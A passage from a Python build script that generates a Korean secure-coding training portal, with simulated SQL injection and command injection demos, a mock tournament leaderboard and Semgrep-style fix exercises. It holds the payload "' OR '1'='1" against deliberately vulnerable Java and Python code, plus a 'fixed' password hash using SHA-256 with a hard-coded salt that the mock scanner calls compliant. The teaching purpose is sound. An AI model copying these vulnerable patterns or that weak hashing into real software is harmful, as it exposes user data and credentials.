String query = "SELECT * FROM products WHERE category = '" + input + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);
              </div>
              <div class="sandbox-input-row">
                <label style="font-size:12px;color:#94a3b8">공격 값 (SQLi Payload):</label>
                <input class="sandbox-input" id="sandboxInput" value="' OR '1'='1">
                <button class="qbtn ghost" onclick="runSandboxExploit()" style="padding:6px 14px;font-size:12px">💥 공격 수행</button>
              </div>
              <div class="sandbox-input-row" style="border-top:1px solid #1e293b;padding-top:10px">
                <button class="qbtn" onclick="runSandboxFix()" style="padding:8px 16px;font-size:13px;width:100%">🔧 안전한 코드로 수정 및 패치 적용</button>
              </div>
            </div>
          </div>
          
          <!-- Right: Visual Feedback & Console -->
          <div style="display:flex;flex-direction:column;gap:10px">
            <div style="font-size:12px;font-weight:700;color:var(--muted)">🖥️ 웹 애플리케이션 화면 (실시간 변경)</div>
            <div class="sandbox-preview" id="sandboxPreview">
              <h4 style="margin-bottom:6px">📦 상품 검색 페이지</h4>
              <div id="sandboxUI">검색어를 입력하고 공격을 시도해 보세요.</div>
            </div>
            <div style="font-size:12px;font-weight:700;color:var(--muted)">💻 데이터베이스 실시간 디버그 로그</div>
            <div class="sandbox-console" id="sandboxConsole">Waiting for action...</div>
          </div>
        </div>
      </div>
      
      <!-- 2) Contextual Developer Hook -->
      <div class="saas-section">
        <h3><span class="saas-badge">Feature 2</span> 개발 파이프라인(IDE & Jira) 콘텍스트 연계 학습</h3>
        <p class="sub" style="margin-bottom:14px">개발자가 취약점을 생성하거나 결함 티켓을 받았을 때, 업무를 벗어나지 않고 그 자리에서 즉시 본 포털의 핵심 강의 카드로 연결되는 플러그인 연동 데모입니다.</p>
        
        <div class="saas-grid-2">
          <!-- IDE plugin simulator -->
          <div class="hook-ide">
            <div class="hook-ide-h">
              <span>Untitled-1.py — Visual Studio Code</span>
              <span style="color:#64748b">Line 12, Col 8</span>
            </div>
            <div class="hook-ide-body">
              <pre style="background:transparent;padding:0;font-size:12px">import os
def execute_cmd(user_dir):
    # 외부 입력값의 무검증 운영체제 명령 실행
    os.system("ls -la " + user_dir)</pre>
              <div class="hook-warning">
                <div class="hook-warning-h">⚠️ Semgrep Alert: KISA-OS-Command-Injection</div>
                <div class="hook-warning-b">
                  외부 입력이 검증 없이 시스템 쉘 명령으로 전달됩니다. 위험도: <b style="color:#ef4444">High</b><br>
                  <span class="hook-warning-lnk" onclick="tab('learn');setLearnCat('입력검증');setTimeout(()=>toggleCard(4),100);">👉 KISA 49개 표준 대응법 카드 열기 (CWE-78)</span>
                </div>
              </div>
            </div>
          </div>
          
          <!-- Jira ticket widget simulator -->
          <div class="hook-jira">
            <div class="hook-jira-h">🌐 Jira Ticket: SEC-402 (XSS 취약점 발생)</div>
            <div>
              <b>요약:</b> 사용자 피드백 페이지에 스크립트 주입 취약점이 발견되었습니다. (CWE-79)<br>
              <div class="hook-jira-widget">
                <div style="font-size:12px;color:#1e3a8a;font-weight:700;margin-bottom:4px">🎓 연관 시큐어 코딩 빠른 복습</div>
                <div style="font-size:11.5px;color:#475569">
                  아래 카드로 인출 학습을 마치면 티켓이 부분 할당 해제됩니다.<br>
                  <b>Q. XSS를 막기 위한 대표적인 문자열 치환 및 인코딩 기술은?</b>
                </div>
                <button class="qbtn ghost" style="padding:4px 10px;font-size:11px;margin-top:6px" onclick="tab('flash');setFlashCat('입력검증');">🃏 플래시 카드로 빠르게 정답 확인</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      <!-- 3) Adaptive Persona Paths -->
      <div class="saas-section">
        <h3><span class="saas-badge">Feature 3</span> 개발 직군 맞춤형 적응형 커리큘럼</h3>
        <p class="sub" style="margin-bottom:14px">임베디드 C 개발자가 불필요하게 웹 취약점을 풀지 않도록, 개발자 페르소나에 맞춰 KISA 49개 약점을 맞춤 필터링하는 로직입니다.</p>
        
        <label style="font-size:13px;font-weight:700;color:#334155;display:block;margin-bottom:6px">직군 페르소나 선택:</label>
        <select class="persona-sel" id="personaSel" onchange="filterPersonaPath()">
          <option value="all">전체 커리큘럼 (49개 약점)</option>
          <option value="fe">Frontend Web Developer (React / TS)</option>
          <option value="be">Backend Enterprise Developer (Java / Spring)</option>
          <option value="emb">Embedded / System Developer (C / C++)</option>
          <option value="devops">Cloud & DevOps Architect</option>
        </select>
        
        <div class="persona-prog-info">
          <span>권장 학습 진행률</span>
          <span id="personaProgVal">0%</span>
        </div>
        <div class="persona-prog-container">
          <div class="persona-prog-bar" id="personaProgBar" style="width: 0%"></div>
        </div>

        <div class="persona-paths" id="personaPaths"></div>
      </div>
      
      <!-- 4) Tournament Leaderboard -->
      <div class="saas-section">
        <h3><span class="saas-badge">Feature 4</span> 사내 토너먼트 실시간 리더보드 시뮬레이터</h3>
        <p class="sub" style="margin-bottom:14px">B2B SaaS 도입 시 부서원 간의 경쟁 심리를 자극하여 교육 완주율을 80% 이상으로 극대화하는 게이미피케이션 실시간 동적 대시보드 데모입니다.</p>
        
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
          <span style="font-size:12.5px;font-weight:700;color:#4f46e5">🏆 사내 시큐어코딩 토너먼트 (26-06 시즌)</span>
          <button class="qbtn ghost" style="padding:6px 14px;font-size:12px" onclick="simulateTournamentScore()">⚡ 실시간 점수 업데이트 시뮬레이션</button>
        </div>
        
        <div class="tour-lb" id="tourLb"></div>
      </div>
      
      <!-- 5) Semgrep Debugging Training -->
      <div class="saas-section">
        <h3><span class="saas-badge">Feature 5</span> 실제 SAST 도구(Semgrep) 연동 로그 디버깅 훈련</h3>
        <p class="sub" style="margin-bottom:14px">학습자가 작성한 코드를 백엔드 정적 분석 도구로 분석한 뒤 출력되는 경고 로그를 직접 보며 취약점을 정밀 수정하는 실전형 워크플로우 훈련 화면입니다.</p>
        
        <div class="semgrep-panel">
          <!-- Log output -->
          <div class="semgrep-log" id="semgrepLog">
[semgrep] Scanning app.py...
[semgrep] Found 1 issue:

[KISA-CWE-327] 취약한 암호 알고리즘 사용
  --> app.py:15
  --> import hashlib
  --> h = hashlib.md5(passwd.encode()).hexdigest()
      
[!] MD5는 충돌 쌍 탐지가 용이하여 비밀번호 일방향 암호화에 안전하지 않습니다.
[!] 안전한 암호 모듈(SHA-256, bcrypt 등)로 교체하세요.
          </div>
          
          <!-- Code Edit & Fix -->
          <div style="display:flex;flex-direction:column;gap:8px">
            <div class="sandbox-box" style="border-color:#334155">
              <div class="sandbox-header" style="background:#1e293b">
                <span>📝 app.py (비밀번호 저장 모듈)</span>
                <span style="font-size:11px;color:#22c55e" id="semgrepStatus">🔴 취약점 발견</span>
              </div>
              <div class="sandbox-body" style="padding:10px">
                <textarea class="codearea" id="semgrepCodeInput" style="height:120px;font-size:12.5px;line-height:1.5;resize:none">
import hashlib
def save_password(passwd):
    # 취약한 md5 사용
    return hashlib.md5(passwd.encode()).hexdigest()
</textarea>
                <button class="ai-fix-btn" id="aiFixBtn" onclick="applyAiSemgrepFix()" style="margin-bottom:4.5px">
                  <i class="fas fa-magic"></i> ✨ AI 권장 취약점 수정 코드 적용
                </button>
                <button class="qbtn" style="padding:8px;font-size:12.5px;width:100%" onclick="runSemgrepScan()">⚙️ Semgrep 스캔 실행</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      
    </div>
  `;
  filterPersonaPath();
  renderTournament();
}

function runSandboxExploit() {
  const payload = document.getElementById('sandboxInput').value;
  const dbConsole = document.getElementById('sandboxConsole');
  const ui = document.getElementById('sandboxUI');
  const preview = document.getElementById('sandboxPreview');
  
  dbConsole.textContent = "Executing Query: SELECT * FROM products WHERE category = '" + payload + "'\n";
  
  if (payload.includes("' OR '1'='1")) {
    dbConsole.textContent += "Database Dump Successful!\nFetched all records from PRODUCTS table.\n";
    ui.innerHTML = `
      <div style="color:#ef4444;font-weight:700;margin-bottom:8px">💥 SQL Injection 공격 성공! DB가 노출되었습니다.</div>
      <table style="width:100%;border-collapse:collapse;font-size:11px;text-align:left">
        <tr style="background:#feca57;color:#1e272e"><th>ID</th><th>이름</th><th>비밀번호</th></tr>
        <tr><td>1</td><td>admin</td><td>admin_p@ss_kisa1!</td></tr>
        <tr><td>2</td><td>db_user</td><td>db_pwd_9219</td></tr>
        <tr><td>3</td><td>tester</td><td>test1234</td></tr>
      </table>
    `;
    preview.className = "sandbox-preview exploited";
  } else {
    dbConsole.textContent += "No records returned or query syntax error.\n";
    ui.innerHTML = "결과 없음: 입력값을 다시 확인하고 `' OR '1'='1` 등의 공격 페이로드를 입력해 보세요.";
    preview.className = "sandbox-preview";
  }
}

function runSandboxFix() {
  const codeBox = document.getElementById('sandboxCode');
  const dbConsole = document.getElementById('sandboxConsole');
  const ui = document.getElementById('sandboxUI');
  const preview = document.getElementById('sandboxPreview');
  
  codeBox.innerHTML = `// 안전한 코드: Prepared Statement 적용
String query = "SELECT * FROM products WHERE category = ?";
PreparedStatement pstmt = conn.prepareStatement(query);
pstmt.setString(1, input);
ResultSet rs = pstmt.executeQuery();`;
  
  const payload = document.getElementById('sandboxInput').value;
  dbConsole.textContent = "Applying secure code patch...\nPrepared Statement Engine Active.\n";
  dbConsole.textContent += "Executing Query: SELECT * FROM products WHERE category = ?\n";
  dbConsole.textContent += "Bound parameter [1] = " + payload + "\nQuery safe. 0 records matched.\n";
  
  ui.innerHTML = `
    <div style="color:#22c55e;font-weight:700;margin-bottom:4px">🛡️ SQL Injection 공격 차단 성공!</div>
    <p style="font-size:12px;color:#475569">매개변수 바인딩 처리에 의해 SQL 페이로드가 일반 문자열로 취급되어 안전합니다.</p>
  `;
  preview.className = "sandbox-preview secured";
}

const PERSONA_DATA = {
  all: [
    {name: 'SQL 삽입', cwe: 'CWE-89', cat: '입력검증'},
    {name: '크로스사이트 스크립트(XSS)', cwe: 'CWE-79', cat: '입력검증'},
    {name: '하드코드된 중요정보', cwe: 'CWE-798', cat: '보안기능'},
    {name: '메모리 버퍼 오버플로우', cwe: 'CWE-120', cat: '코드오류'},
    {name: '취약한 API 사용', cwe: 'CWE-676', cat: 'API오용'}
  ],
  fe: [
    {name: '크로스사이트 스크립트(XSS)', cwe: 'CWE-79', cat: '입력검증'},
    {name: '신뢰되지 않는 URL 주소로 자동접속 연결', cwe: 'CWE-601', cat: '입력검증'},
    {name: '크로스사이트 요청 위조(CSRF)', cwe: 'CWE-352', cat: '보안기능'}
  ],
  be: [
    {name: 'SQL 삽입', cwe: 'CWE-89', cat: '입력검증'},
    {name: '하드코드된 중요정보', cwe: 'CWE-798', cat: '보안기능'},
    {name: '신뢰할 수 없는 데이터의 역직렬화', cwe: 'CWE-502', cat: '코드오류'}
  ],
  emb: [
    {name: '메모리 버퍼 오버플로우', cwe: 'CWE-120', cat: '코드오류'},
    {name: '해제된 자원 사용', cwe: 'CWE-416', cat: '코드오류'},
    {name: '취약한 API 사용', cwe: 'CWE-676', cat: 'API오용'}
  ],
  devops: [
    {name: '중요한 자원에 대한 잘못된 권한 설정', cwe: 'CWE-732', cat: '보안기능'},
    {name: '하드코드된 중요정보', cwe: 'CWE-798', cat: '보안기능'},
    {name: '적절하지 않은 난수값 사용', cwe: 'CWE-330', cat: '보안기능'}
  ]
};

function filterPersonaPath() {
  const sel = document.getElementById('personaSel').value;
  const list = PERSONA_DATA[sel] || PERSONA_DATA.all;
  const host = document.getElementById('personaPaths');
  
  const progMap = { all: '42%', fe: '75%', be: '60%', emb: '30%', devops: '85%' };
  document.getElementById('personaProgVal').textContent = progMap[sel] || '50%';
  document.getElementById('personaProgBar').style.width = progMap[sel] || '50%';

  const colors = { '입력검증': '#ef4444', '보안기능': '#3b82f6', '시간상태': '#f59e0b', '에러처리': '#10b981', '코드오류': '#8b5cf6', 'API오용': '#ec4899', '캡슐화': '#6366f1' };

  host.innerHTML = list.map((item, idx) => {
    const difficulty = ['상', '중', '하'][idx % 3];
    const diffColor = difficulty === '상' ? '#ef4444' : difficulty === '중' ? '#f59e0b' : '#10b981';
    return `
    <div class="persona-card active">
      <div class="persona-card-h">${esc(item.name)}</div>
      <div class="persona-card-d">
        <span>${item.cwe} · <span style="color:${colors[item.cat] || '#666'}">${item.cat}</span></span>
        <span class="persona-badge" style="background:${diffColor}22; color:${diffColor}">${difficulty}</span>
      </div>
    </div>
  `}).join('');
}

let MOCK_TOURNAMENT = [
  {rank: 1, name: '김보안 (기술연구소)', xp: 2450, streak: 8},
  {rank: 2, name: '이개발 (BE개발팀)', xp: 2210, streak: 5},
  {rank: 3, name: '박진단 (인프라실)', xp: 1980, streak: 3},
  {rank: 4, name: '최코딩 (FE개발팀)', xp: 1850, streak: 6},
  {rank: 5, name: '나배움 (신입사원)', xp: 1420, streak: 2}
];

function renderTournament() {
  const host = document.getElementById('tourLb');
  const rows = MOCK_TOURNAMENT.map(p => `
    <div class="tour-row rank-${p.rank <= 3 ? p.rank : 'other'}">
      <div class="tour-rank">${p.rank === 1 ? '🥇' : p.rank === 2 ? '🥈' : p.rank === 3 ? '🥉' : p.rank}</div>
      <div class="tour-name">${esc(p.name)}</div>
      <div class="tour-xp">${p.xp} XP</div>
      <div class="tour-streak">🔥 ${p.streak}일</div>
    </div>
  `).join('');
  
  host.innerHTML = `
    <div class="tour-row head">
      <div class="tour-rank">순위</div>
      <div class="tour-name">이름 (소속)</div>
      <div class="tour-xp">누적 XP</div>
      <div class="tour-streak">스트릭</div>
    </div>
    ${rows}
  `;
}

function simulateTournamentScore() {
  MOCK_TOURNAMENT.forEach(p => {
    p.xp += Math.floor(Math.random() * 80) + 20;
    if (Math.random() > 0.6) p.streak += 1;
  });
  MOCK_TOURNAMENT.sort((a,b) => b.xp - a.xp);
  MOCK_TOURNAMENT.forEach((p, i) => p.rank = i + 1);
  renderTournament();
  gamToast("⚡ 실시간 리더보드가 업데이트되었습니다!");
}

function applyAiSemgrepFix() {
  const input = document.getElementById('semgrepCodeInput');
  input.value = `import hashlib
def save_password(passwd):
    # 안전한 sha256 사용 (솔트 포함 권장)
    salt = "secure_kisa_salt_value"
    return hashlib.sha256((passwd + salt).encode()).hexdigest()`;
  gamToast("✨ AI 수정 코드가 에디터에 적용되었습니다. 스캔을 실행하세요!");
}

function runSemgrepScan() {
  const code = document.getElementById('semgrepCodeInput').value;
  const log = document.getElementById('semgrepLog');
  const status = document.getElementById('semgrepStatus');
  
  log.textContent = "[semgrep] Scanning app.py...\n";
  
  if (code.includes("md5") || code.includes("MD5")) {
    log.textContent += `[semgrep] Found 1 issue:

[KISA-CWE-327] 취약한 암호 알고리즘 사용
  --> app.py
  --> import hashlib
  --> h = hashlib.md5(...)
      
[!] MD5는 충돌 쌍 탐지가 용이하여 비밀번호 일방향 암호화에 안전하지 않습니다.
[!] 안전한 암호 모듈(SHA-256, bcrypt 등)로 교체하세요.`;
    status.textContent = "🔴 취약점 발견";
    status.style.color = "#ef4444";
  } else if (code.includes("sha256") || code.includes("SHA256") || code.includes("bcrypt")) {
    log.textContent += `[semgrep] Scan Finished.
[semgrep] 0 issues found.
[semgrep] Code quality is compliance-ready! ✅`;
    status.textContent = "🟢 안전함";
    status.style.color = "#22c55e";
    gamToast("🎉 Semgrep 취약점 조치 완료! 25 XP 획득");
    awardXp(25, "Semgrep 디버깅 훈련 성공");
  } else {
    log.textContent += "[semgrep] Scan finished.\n[semgrep] Warning: md5 취약점은 해결되었으나 검증된 표준 알고리즘(sha256 등)을 사용하는지 확인해 보세요.";
    status.textContent = "🟡 점검 필요";
    status.style.color = "#f59e0b";
  }
}

// ===== 접근성(WCAG) 초기화: 탭 ARIA · 패널 role · 1교시 키보드 단축키 =====
function a11yInit(){
  document.querySelectorAll('.tab').forEach(t=>{t.setAttribute('role','tab');t.setAttribute('aria-selected',t.classList.contains('on')?'true':'false');});
  document.querySelectorAll('.view').forEach(x=>{x.setAttribute('role','tabpanel');x.setAttribute('tabindex','0');});
  // 1교시 이론 키보드: 숫자(객관식 보기)/O·X(OX)/Enter(다음)
  document.addEventListener('keydown',function(e){
    const ev=document.getElementById('v-exam'); if(!ev||!ev.classList.contains('on'))return;
    if(e.target&&/^(INPUT|TEXTAREA|SELECT)$/.test(e.target.tagName))return;
    const q=exPool[exIdx]; if(!q)return;
    if(q.type==='MC'&&/^[1-9]$/.test(e.key)){const i=+e.key-1;if(q.o&&i<q.o.length)pickEx(i);}
    else if(q.type==='OX'){if(/^[oO1]$/.test(e.key))pickEx(true);else if(/^[xX2]$/.test(e.key))pickEx(false);}
    if(e.key==='Enter'){e.preventDefault();nextEx();}
  });
}
a11yInit();
rDash();
</script>
</body>
</html>'''


def main():
    a = importlib.import_module('specs_academy')
    pr = importlib.import_module('specs_academy_practical')
    cc = importlib.import_module('specs_code49')
    bs = importlib.import_module('_basics')
    tl = importlib.import_module('_tools')
    rn = importlib.import_module('_runnable')
    dz = importlib.import_module('_design')
    tr = importlib.import_module('specs_trees')
    ex = importlib.import_module('_exam_emphasis')
    # 진단 의사결정 흐름(TREES)·시험 강조(EXAM)를 약점명으로 join 하여 각 개념카드에 주입
    for c in a.CONCEPTS:
        c['tree'] = tr.TREES.get(c['name'])
        c['exam'] = ex.EXAM.get(c['name'])
    # <script> 조기 종료 방지: 임베드 데이터의 </ 를 <\/ 로 이스케이프(런타임 JS 파싱 동일)
    def jdump(o):
        return json.dumps(o, ensure_ascii=False).replace('</', '<\\/')
    html = (TPL.replace('__CONCEPTS__', jdump(a.CONCEPTS))
               .replace('__QUIZ__', get_quiz_bank().replace('</', '<\\/'))
               .replace('__PRACTICAL__', jdump(pr.PRACTICAL))
               .replace('__THEORY__', jdump(pr.THEORY))
               .replace('__CODE49__', jdump(cc.CODE49))
               .replace('__BASICS__', jdump(bs.BASICS))
               .replace('__TOOLS__', jdump({'tools': tl.TOOLS, 'position': tl.POSITION}))
               .replace('__RUNNABLE__', jdump(rn.RUNNABLE))
               .replace('__DESIGN__', jdump(dz.DESIGN)))
    open(os.path.join(OUT, 'secure-dev-academy.html'), 'w', encoding='utf-8').write(html)
    
    # Export JS data for standalone training portal pages
    js_dir = os.path.join(OUT, 'js')
    if not os.path.exists(js_dir):
        os.makedirs(js_dir)
    js_data = f"""// Auto-generated academy data
window.ACADEMY_DATA = {{
  CONCEPTS: {jdump(a.CONCEPTS)},
  QUIZ: {get_quiz_bank()},
  PRACTICAL: {jdump(pr.PRACTICAL)},
  THEORY: {jdump(pr.THEORY)},
  CODE49: {jdump(cc.CODE49)},
  BASICS: {jdump(bs.BASICS)},
  TOOLS: {jdump({'tools': tl.TOOLS, 'position': tl.POSITION})},
  RUNNABLE: {jdump(rn.RUNNABLE)},
  DESIGN: {jdump(dz.DESIGN)}
}};"""
    open(os.path.join(js_dir, 'academy-data.js'), 'w', encoding='utf-8').write(js_data)
    
    print('wrote secure-dev-academy.html & js/academy-data.js | concepts=%d quiz(BANK) practical=%d theory=%d basics=%d tools=%d runnable=%d design=%d'
          % (len(a.CONCEPTS), len(pr.PRACTICAL), len(pr.THEORY), len(bs.BASICS), len(tl.TOOLS), len(rn.RUNNABLE), len(dz.DESIGN)))


if __name__ == '__main__':
    main()
